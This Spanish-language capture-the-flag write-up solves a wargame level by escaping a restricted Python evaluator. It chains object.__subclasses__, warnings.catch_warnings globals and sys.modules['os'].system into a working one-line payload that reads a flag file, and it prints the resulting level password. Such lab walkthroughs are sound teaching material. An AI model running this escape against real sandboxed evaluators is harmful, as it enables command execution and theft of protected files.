# Level07 - Snow Crash

## Tipo de ejercicio

Escape de un sandbox Python mediante introspección de objetos y acceso a un
módulo del proceso para ejecutar comandos del sistema.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level08`.

El nivel presenta un validador Python restringido: las
entradas no se ejecutan como comandos Bash, sino como expresiones Python.

## 1. Reconocer el validador

Al entrar en `level07`, el prompt muestra:

```text
Session validator v2.1.4 — restricted access
You will never escape this
```

El comportamiento de la sesión es mixto: algunos comandos, como `ls -la` y
`whoami`, funcionan normalmente, pero `hostname` se interpreta como un nombre
Python y devuelve `Validator: name 'hostname' is not defined`. Para comprobar
que también podemos introducir expresiones Python, probamos una expresión que
no depende de comandos del sistema:

```python
().__class__
```

Resultado:

```text
<class 'tuple'>
```

`()` crea una tupla vacía y `.__class__` consulta su clase. El resultado
confirma que el validador evalúa expresiones Python y permite inspeccionar
atributos de objetos. Esta prueba no obtiene la credencial, pero proporciona
el punto de partida para llegar a `object` y continuar la resolución.

## 2. Llegar hasta object

Partimos de la tupla vacía que ya utilizamos. `.__class__` devuelve su clase
(`tuple`) y `.__base__` devuelve la clase base de `tuple`, que es `object`:

```python
().__class__.__base__
```

Resultado:

```text
<class 'object'>
```

`object` es la clase base común de los objetos Python. Su atributo
`__subclasses__()` devuelve la lista de clases que el intérprete ya tiene
cargadas:

```python
().__class__.__base__.__subclasses__()
```

Entre esa lista buscamos `warnings.catch_warnings`, porque su método interno
conserva una referencia a los módulos globales que necesitaremos en el paso
siguiente:

```text
<class 'warnings.catch_warnings'>
```

## 3. Recuperar el módulo sys

La clase `warnings.catch_warnings` conserva una referencia a las variables
globales de su método `__init__`. Primero la localizamos con una comprensión de
listas. La variable `c` representa cada clase de la lista y la condición deja
solo la que tiene el nombre `catch_warnings`:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

```text
[<class 'warnings.catch_warnings'>]
```

`c.__init__` es el método que inicializa la clase y `.__globals__` permite
acceder al diccionario de variables globales usado por ese método. El
validador bloquea nombres como `open` y `__import__`, pero desde ese diccionario
podemos recuperar el módulo `sys`, que ya está cargado:

```python
[c.__init__.__globals__['sys'] for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

```text
[<module 'sys' (built-in)>]
```

`sys.modules` es el registro de módulos que Python ya ha cargado. `os` es un
módulo estándar que permite interactuar con el sistema operativo, por ejemplo
ejecutar comandos. Al consultar `.keys()` vemos los nombres de los módulos y
podemos comprobar que `os` está disponible sin tener que importarlo:

```python
[c.__init__.__globals__['sys'].modules.keys() for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

```text
...  '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', '_distutils_hack', 'types', 'importlib._bootstrap', 'importlib._bootstrap_external', 'warnings', 'importlib', 'importlib._abc', ...
```

## 4. Ejecutar el comando con os.system

`sys.modules` solo nos ha confirmado que `os` está cargado. La función que
usaremos es `os.system()`, que ejecuta un comando del sistema y devuelve su
código de salida. Su funcionamiento queda confirmado al ejecutar la expresión
final: el resultado `[0]` indica que el comando terminó correctamente. `os.popen()`
no se utiliza porque el validador bloquea su intento de importar
`subprocess`.

La expresión utilizada se ha creado expresamente para documentar esta
resolución y está guardada en el recurso auxiliar
[sandbox-escape.expr](sandbox-escape.expr). No es un archivo de la OVA ni se
obtiene desde el sandbox:

```python
[c.__init__.__globals__['sys'].modules['os'].system('cat /home/flag07/.flag') for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings']
```

Al introducirlo en el validador, se obtuvo:

```text
fiumuikeil8rung8ahcuiperb
[0]
```

El `0` es el código de retorno de `os.system`; la credencial se imprime antes.

## 5. Conectarse a level08

Desde el equipo anfitrión:

```bash
exit
ssh level08@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
fiumuikeil8rung8ahcuiperb
```

## Conclusión

El nivel no requiere modificar archivos de la OVA. La vulnerabilidad está en
el sandbox Python, que permite acceder a `object.__subclasses__()`, encontrar
`warnings.catch_warnings`, recuperar `sys.modules` y reutilizar el módulo `os`
ya cargado. `os.system()` ejecuta `cat /home/flag07/.flag` y revela la
credencial de `level08`.
